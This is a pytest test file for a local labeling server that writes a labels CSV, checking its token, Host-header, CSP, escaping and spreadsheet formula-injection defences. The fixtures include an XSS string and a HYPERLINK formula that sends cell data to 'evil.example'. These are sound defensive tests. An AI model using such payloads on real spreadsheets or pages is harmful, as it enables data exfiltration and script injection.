"""The labeling server `judgekeeper start` builds on (label.py): a local page on 127.0.0.1, its
security (token, Host check, CSP) and the labels CSV it writes on every click.

`start` gives the session its page data and progress (start_label.StartSession); here a small
session does the same, so the shared parts are tested on their own."""

import csv
import http.client
import json
import os
import threading
from pathlib import Path

import pytest

from judgekeeper import label as label_mod
from judgekeeper import textio
from judgekeeper.label import LabelError, LabelServer, LabelSession

# A page as the caller passes it: the server fills in the nonce, the token and the data.
PAGE = ('<!doctype html><title>labels</title>'
        '<script type="application/json" id="data">__DATA__</script>'
        '<script nonce="__NONCE__">var TOKEN = "__TOKEN__";</script>')


class Session(LabelSession):
    """The page data and the progress, as a caller adds them (start_label.StartSession)."""

    def summary(self):
        return {"n_items": len(self.items),
                "n_labeled": sum(1 for i in self.items if i["label"]),
                "n_deferred": sum(1 for i in self.items if i["deferred"]),
                "done": all(i["label"] or i["deferred"] for i in self.items)}

    def state(self):
        start = next((n for n, i in enumerate(self.items)
                      if not i["label"] and not i["deferred"]), 0)
        return {"kind": self.kind, "labels": list(self.labels), "items": self.items,
                "start": start, "summary": self.summary()}


def _items(tmp_path, n=4, pairwise=False, extra=None):
    path = tmp_path / "items.jsonl"
    rows = []
    for i in range(n):
        if pairwise:
            row = {"id": f"p{i}", "input": f"q{i}", "output_a": f"a{i}", "output_b": f"b{i}"}
        else:
            row = {"id": f"it{i}", "input": f"question {i}", "output": f"answer {i}"}
        rows.append({**row, **(extra or {})})
    path.write_text("".join(json.dumps(r) + "\n" for r in rows), encoding="utf-8")
    return path


def _read(path):
    with Path(path).open(newline="", encoding="utf-8") as f:
        return list(csv.DictReader(f))


class Client:
    def __init__(self, server):
        self.server = server

    def request(self, method, path, body=None, token=True, host=None):
        conn = http.client.HTTPConnection("127.0.0.1", self.server.port, timeout=5)
        if token:
            path += ("&" if "?" in path else "?") + f"token={self.server.token}"
        headers = {"Host": host or f"127.0.0.1:{self.server.port}"}
        data = None
        if body is not None:
            data = json.dumps(body).encode()
            headers["Content-Type"] = "application/json"
        conn.request(method, path, body=data, headers=headers)
        resp = conn.getresponse()
        payload = resp.read()
        conn.close()
        return resp, payload

    def state(self):
        resp, payload = self.request("GET", "/state")
        assert resp.status == 200
        return json.loads(payload)

    def label(self, **body):
        resp, payload = self.request("POST", "/label", body)
        return resp.status, json.loads(payload)


@pytest.fixture
def serve():
    started = []

    def start(items, out, **kw):
        server = LabelServer(Session(items, out), port=0, page=PAGE)
        thread = threading.Thread(target=server.serve, kwargs=kw, daemon=True)
        thread.start()
        started.append((server, thread))
        return Client(server)

    yield start
    for server, thread in started:
        server.stop()
        thread.join(timeout=5)


def test_binds_loopback_only(tmp_path, serve):
    client = serve(_items(tmp_path), tmp_path / "labels.csv")
    assert client.server.host == "127.0.0.1"
    assert client.server.url.startswith(f"http://127.0.0.1:{client.server.port}/?token=")
    assert len(client.server.token) >= 32


def test_page_is_self_contained(tmp_path, serve):
    client = serve(_items(tmp_path), tmp_path / "labels.csv")
    resp, payload = client.request("GET", "/")
    assert resp.status == 200
    page = payload.decode()
    assert page.startswith("<!doctype html>")
    for external in ('src="http', "src='http", 'href="http', "//cdn", "@import", "fetch('http",
                     'fetch("http'):
        assert external not in page
    csp = resp.getheader("Content-Security-Policy")
    assert "default-src 'none'" in csp and "connect-src 'self'" in csp
    assert "font-src data:" in csp  # the heading font is embedded in the page
    nonce = csp.split("'nonce-")[1].split("'")[0]
    assert f'nonce="{nonce}"' in page and client.server.token in page


def test_every_request_needs_the_token(tmp_path, serve):
    out = tmp_path / "labels.csv"
    client = serve(_items(tmp_path), out)
    for method, path, body in (("GET", "/", None), ("GET", "/state", None),
                               ("POST", "/label", {"id": "it0", "label": "pass"})):
        resp, _ = client.request(method, path, body, token=False)
        assert resp.status == 403
        resp, _ = client.request(method, path + "?token=wrong", body, token=False)
        assert resp.status == 403
    assert not out.exists()
    status, _ = client.label(id="it0", label="pass")
    assert status == 200
    assert _read(out)[0]["human_label"] == "pass"


@pytest.mark.parametrize("host", ["evil.example", "evil.example:{port}", "localhost:{port}",
                                  "127.0.0.1:1", "0.0.0.0:{port}"])
def test_host_header_must_be_the_bound_address(tmp_path, serve, host):
    out = tmp_path / "labels.csv"
    client = serve(_items(tmp_path), out)
    host = host.format(port=client.server.port)
    resp, _ = client.request("GET", "/", host=host)
    assert resp.status == 403
    resp, _ = client.request("POST", "/label", {"id": "it0", "label": "pass"}, host=host)
    assert resp.status == 403
    assert not out.exists()


def test_labels_are_written_immediately(tmp_path, serve):
    out = tmp_path / "labels.csv"
    client = serve(_items(tmp_path), out)
    client.label(id="it0", label="pass")
    status, state = client.label(id="it1", label="fail", note="wrong unit")
    assert status == 200
    rows = _read(out)
    assert list(rows[0]) == ["id", "input", "output", "human_label", "notes"]
    assert [r["id"] for r in rows] == ["it0", "it1", "it2", "it3"]
    assert [r["human_label"] for r in rows] == ["pass", "fail", "", ""]
    assert rows[1]["notes"] == "wrong unit" and rows[1]["output"] == "answer 1"
    s = state["summary"]
    assert s["n_items"] == 4 and s["n_labeled"] == 2 and s["n_deferred"] == 0


def test_undo_clears_a_label(tmp_path, serve):
    out = tmp_path / "labels.csv"
    client = serve(_items(tmp_path), out)
    client.label(id="it0", label="pass")
    status, state = client.label(id="it0", label=None)
    assert status == 200 and state["summary"]["n_labeled"] == 0
    assert _read(out)[0]["human_label"] == ""


def test_writes_are_atomic(tmp_path, serve, monkeypatch):
    out = tmp_path / "labels.csv"
    client = serve(_items(tmp_path), out)
    client.label(id="it0", label="pass")
    before = out.read_bytes()
    calls = []
    real_replace = os.replace

    def replace(src, dst):
        calls.append((Path(src), Path(dst)))
        raise OSError("disk full")

    monkeypatch.setattr(textio.os, "replace", replace)
    status, body = client.label(id="it1", label="fail")
    assert status == 500 and "disk full" in body["error"]
    assert out.read_bytes() == before  # the old file is intact
    src, dst = calls[0]
    assert dst == out and src.parent == out.parent and src != out
    assert sorted(p.name for p in tmp_path.iterdir()) == ["items.jsonl", "labels.csv"]

    monkeypatch.setattr(textio.os, "replace", real_replace)
    status, _ = client.label(id="it1", label="fail")
    assert status == 200
    assert [r["human_label"] for r in _read(out)][:2] == ["pass", "fail"]


def test_reopening_resumes(tmp_path, serve):
    items, out = _items(tmp_path), tmp_path / "labels.csv"
    client = serve(items, out)
    client.label(id="it0", label="pass", note="ok")
    client.label(id="it1", label="fail")
    client.server.stop()

    session = Session(items, out)
    state = session.state()
    assert [i["label"] for i in state["items"]] == ["pass", "fail", None, None]
    assert state["items"][0]["note"] == "ok"
    assert state["start"] == 2  # the first item still to label
    assert state["summary"]["n_labeled"] == 2


def test_resume_reads_spreadsheet_spellings(tmp_path):
    items, out = _items(tmp_path, n=2), tmp_path / "labels.csv"
    out.write_text("id,input,output,human_label,notes\nit0,question 0,answer 0,Yes,\n"
                   "it1,question 1,answer 1,,\n", encoding="utf-8")
    state = Session(items, out).state()
    assert [i["label"] for i in state["items"]] == ["pass", None]


def test_out_with_unknown_ids_is_refused(tmp_path):
    out = tmp_path / "labels.csv"
    out.write_text("id,input,output,human_label,notes\nzzz,q,o,pass,\n")
    with pytest.raises(LabelError, match="zzz"):
        LabelSession(_items(tmp_path), out)


def test_deferred_items_stay_unlabeled(tmp_path, serve):
    out = tmp_path / "labels.csv"
    client = serve(_items(tmp_path), out)
    status, state = client.label(id="it2", deferred=True)
    assert status == 200
    assert state["summary"]["n_labeled"] == 0 and state["summary"]["n_deferred"] == 1
    assert all(r["human_label"] == "" for r in _read(out))
    status, state = client.label(id="it2", label="fail")  # labeling clears the deferral
    assert state["summary"]["n_deferred"] == 0 and state["summary"]["n_labeled"] == 1


def test_bad_requests(tmp_path, serve):
    client = serve(_items(tmp_path), tmp_path / "labels.csv")
    assert client.label(id="it0", label="A")[0] == 400  # pairwise label on a single item
    assert client.label(id="nope", label="pass")[0] == 404
    resp, _ = client.request("POST", "/label", None)
    assert resp.status == 400
    resp, _ = client.request("GET", "/nothing")
    assert resp.status == 404


def test_pairwise_records_a_and_b(tmp_path, serve):
    out = tmp_path / "labels.csv"
    client = serve(_items(tmp_path, n=2, pairwise=True), out)
    state = client.state()
    assert state["kind"] == "pairwise" and state["labels"] == ["A", "B"]
    assert state["items"][0]["output_a"] == "a0" and state["items"][0]["output_b"] == "b0"
    assert client.label(id="p0", label="pass")[0] == 400
    client.label(id="p0", label="A")
    client.label(id="p1", label="B")
    rows = _read(out)
    assert list(rows[0]) == ["id", "input", "output_a", "output_b", "human_label", "notes"]
    assert [r["human_label"] for r in rows] == ["A", "B"]


def test_strings_are_escaped(tmp_path, serve):
    path = tmp_path / "items.jsonl"
    evil = "<script>alert(1)</script>"
    path.write_text(json.dumps({"id": "x", "input": evil, "output": f"</script>{evil}"}) + "\n",
                    encoding="utf-8")
    client = serve(path, tmp_path / "labels.csv")
    resp, payload = client.request("GET", "/")
    page = payload.decode()
    assert "alert(1)" in page  # the item is in the page...
    assert "<script>alert" not in page and "</script><script>" not in page  # ...but inert
    resp, payload = client.request("GET", "/state")
    assert resp.getheader("Content-Type").startswith("application/json")
    assert resp.getheader("X-Content-Type-Options") == "nosniff"
    assert json.loads(payload)["items"][0]["input"] == evil


def test_server_exits_when_idle(tmp_path):
    server = LabelServer(Session(_items(tmp_path), tmp_path / "labels.csv"), port=0, page=PAGE)
    thread = threading.Thread(target=server.serve, kwargs={"idle_timeout": 0.3}, daemon=True)
    thread.start()
    thread.join(timeout=5)
    assert not thread.is_alive()


def test_items_without_an_output_are_refused(tmp_path):
    path = tmp_path / "items.jsonl"
    path.write_text(json.dumps({"id": "x", "input": "q"}) + "\n", encoding="utf-8")
    with pytest.raises(LabelError, match="output"):
        LabelSession(path, tmp_path / "labels.csv")


# --- spreadsheet formula injection ----------------------------------------------------------------


def test_written_sheet_neutralises_formula_prefixes(tmp_path, serve):
    items = tmp_path / "items.jsonl"
    items.write_text(json.dumps({"id": "it0", "input": "=1+1", "output": "@cmd"}) + "\n",
                     encoding="utf-8")
    out = tmp_path / "labels.csv"
    client = serve(items, out)
    client.label(id="it0", label="pass", note="-not a formula")
    row = _read(out)[0]
    assert (row["input"], row["output"], row["notes"]) == ("'=1+1", "'@cmd", "'-not a formula")
    client.server.stop()
    first = Session(items, out).state()["items"][0]
    # The quote is only in the file; what the browser shows is the original text.
    assert (first["input"], first["output"], first["note"]) == ("=1+1", "@cmd", "-not a formula")


def test_formula_ids_are_guarded_and_survive_resume(tmp_path, serve):
    """The id column is a cell like any other."""
    ids = ('=HYPERLINK("http://evil.example/?x="&A1,"click")', "+1+1", "-2", "@SUM(1)",
           "\ttab", "\rcr")
    items = tmp_path / "items.jsonl"
    items.write_text("".join(json.dumps({"id": i, "input": f"q{n}", "output": f"a{n}"}) + "\n"
                             for n, i in enumerate(ids)), encoding="utf-8")
    known = [i.strip() for i in ids]  # ids are trimmed when read, here as everywhere
    out = tmp_path / "labels.csv"
    client = serve(items, out)
    for item_id in known:
        status, _ = client.label(id=item_id, label="pass")
        assert status == 200
    with out.open(newline="", encoding="utf-8") as f:
        cells = [cell for row in list(csv.reader(f))[1:] for cell in row]
    assert not [c for c in cells if c.startswith(("=", "+", "-", "@", "\t", "\r"))]
    client.server.stop()
    resumed = LabelSession(items, out)  # the guarded ids are recognised, not "unknown ids"
    assert [(i["id"], i["label"]) for i in resumed.items] == [(i, "pass") for i in known]
    resumed.update({"id": known[0], "label": "fail"})
    again = LabelSession(items, out)
    assert [i["id"] for i in again.items] == known
    assert known[:4] == list(ids[:4])
    assert again.items[0]["label"] == "fail"


def test_idle_connection_does_not_freeze_the_server(tmp_path, serve, monkeypatch):
    """A connection that sends nothing must not block the rest."""
    import socket
    import time

    monkeypatch.setattr(label_mod, "CONNECTION_TIMEOUT", 1.0)
    client = serve(_items(tmp_path), tmp_path / "labels.csv")
    idle = socket.create_connection(("127.0.0.1", client.server.port))
    try:
        time.sleep(0.3)  # the server has accepted the silent connection and is waiting on it
        start = time.monotonic()
        assert client.state()["summary"]["n_items"] == 4
        assert time.monotonic() - start < 4
    finally:
        idle.close()


# Stopping by itself once the result is served (the page `judgekeeper start` passes)

def _serve_until_done(tmp_path, **kw):
    server = LabelServer(Session(_items(tmp_path, n=3), tmp_path / "labels.csv"), port=0,
                         page=PAGE, **kw)
    thread = threading.Thread(target=server.serve, daemon=True)
    thread.start()
    return server, thread, Client(server)


def _result(session, back):
    assert back.startswith("/?token=")
    return f"<!doctype html><p>{session.summary()['n_labeled']} labeled</p>"


def test_with_a_result_it_stops_after_serving_it(tmp_path):
    _, thread, client = _serve_until_done(tmp_path, result=_result)
    assert client.label(id="it0", label="pass")[0] == 200
    assert client.label(id="it1", deferred=True)[0] == 200
    assert thread.is_alive(), "two of three: still serving"
    status, body = client.label(id="it2", label="fail")
    assert status == 200 and body["summary"]["done"]
    thread.join(timeout=0.5)
    assert thread.is_alive(), "done, but the page has not fetched the result yet"
    resp, payload = client.request("GET", "/result")
    assert resp.status == 200 and payload.decode() == "<!doctype html><p>2 labeled</p>"
    assert resp.getheader("Content-Type") == "text/html; charset=utf-8"
    thread.join(timeout=5)
    assert not thread.is_alive()
    assert [r["human_label"] for r in _read(tmp_path / "labels.csv")] == ["pass", "", "fail"]


def test_a_result_before_the_end_keeps_serving(tmp_path):
    server, thread, client = _serve_until_done(tmp_path, result=_result)
    client.label(id="it0", label="pass")
    resp, payload = client.request("GET", "/result")
    assert resp.status == 200 and b"1 labeled" in payload
    assert "script-src" not in resp.getheader("Content-Security-Policy")
    thread.join(timeout=0.5)
    assert thread.is_alive()
    server.stop()
    thread.join(timeout=5)


def test_with_a_result_it_stops_anyway_when_nobody_fetches_it(tmp_path, monkeypatch):
    monkeypatch.setattr(label_mod, "RESULT_WAIT", 0.3)
    _, thread, client = _serve_until_done(tmp_path, result=_result)
    for n in range(3):
        client.label(id=f"it{n}", label="pass")
    thread.join(timeout=5)
    assert not thread.is_alive()


def test_without_a_result_it_keeps_serving_when_done(tmp_path):
    server, thread, client = _serve_until_done(tmp_path)
    for n in range(3):
        assert client.label(id=f"it{n}", label="pass")[0] == 200
    thread.join(timeout=0.5)
    assert thread.is_alive()
    server.stop()
    thread.join(timeout=5)


def test_without_a_result_there_is_no_result_page(tmp_path):
    server, thread, client = _serve_until_done(tmp_path)
    try:
        assert client.request("GET", "/result")[0].status == 404
    finally:
        server.stop()
        thread.join(timeout=5)
